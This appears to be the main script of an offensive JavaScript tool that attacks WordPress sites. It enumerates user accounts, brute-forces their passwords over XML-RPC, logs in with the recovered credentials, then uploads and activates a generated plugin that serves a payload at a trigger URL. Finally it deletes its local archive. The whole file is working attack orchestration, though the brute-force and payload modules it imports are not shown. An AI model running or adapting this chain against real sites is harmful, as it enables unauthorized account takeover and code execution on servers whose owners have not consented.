import * as utils from './lib/utils.js'
import { getUsers } from './src/enumUsers.js'
import * as plugin from './src/plugin.js'
import { isXmlRpcEnable, bruteForcePassword  } from './src/xml-rpc.js'
import { login } from './src/login.js'
import { checkConfig } from './config/checkConfig.js'
import { appConfig } from './config/appConfig.js'


(async function run() {
    try {
        utils.displayBanner()

        // Load configuration
        console.log(`-> Checking configuration`)
        checkConfig()
        const host = appConfig.host.url
        console.log(`${ utils.printCheck.success() } Configuration loaded`)

        // Check if host is up
        console.log(`-> Checking if host is up`)
        const isHostReachable = await utils.isReachable(host)

        if (!isHostReachable) {
            console.error(`${ utils.printCheck.failure() } Host ${ utils.textColoring(host, "yellow") } is not reachable`)
            utils.exit(0)
        } else {
            console.log(`${ utils.printCheck.success() } Host ${ host } is up`)
        }

        // Enumerate users
        const users = await getUsers(host)
        console.log(utils.printCheck.success() +
            ` Found the following user(s): ${ users.toString().replaceAll(',', ', ') }`)

        // Check if xml-rpc is reachable
        console.log(`-> Starting bruteforce`)
        const isXmlRpcReachable = await isXmlRpcEnable(host)

        if (!isXmlRpcReachable) {
            console.error(`${ utils.printCheck.failure() } Could not reach XML-RPC, it might be disabled`)
            utils.exit(0)
        } else {
            console.log(`${ utils.printCheck.success() } XML-RPC is reachable`)
        }

        // Start bruteforce
        const allCredentials = await bruteForcePassword(host, users)

        // Login as a user
        console.log(`-> Trying to log-in`)
        const loggedCookies = await login(host, allCredentials[0].user, allCredentials[0].password)
        console.log(utils.printCheck.success() +
            ` Successfully logged using ${ utils.textColoring(allCredentials[0].user, 'blue') } credentials`)

        // Generate plugin
        console.log(`-> Generating plugin`)
        const triggerUrl = await plugin.generatePlugin(host)
        console.log(`${ utils.printCheck.success() } Plugin generated`)

        // Upload plugin
        console.log(`-> Uploading plugin`)
        const enableData = await plugin.uploadPlugin(host, loggedCookies)
        console.log(`${ utils.printCheck.success() } Plugin successfully uploaded`)

        // Enable plugin
        console.log(`-> Enabling plugin`)
        await plugin.enablePlugin(host, enableData.activatePluginLink, enableData.cookies, enableData.pluginName)
        console.log(`${ utils.printCheck.success() } Plugin is now enabled`)
        console.log(`${ utils.printCheck.success() } Payload available at: ${ triggerUrl }`)

        // Remove local zip archive
        await utils.removeFile(appConfig.app.rootPath + appConfig.app.archivePath)

        utils.exit(0)
    } catch (error) {
        await utils.removeFile(appConfig.app.rootPath + appConfig.app.archivePath)
        utils.logging.error(error)

        utils.exit(1)
    }
})()
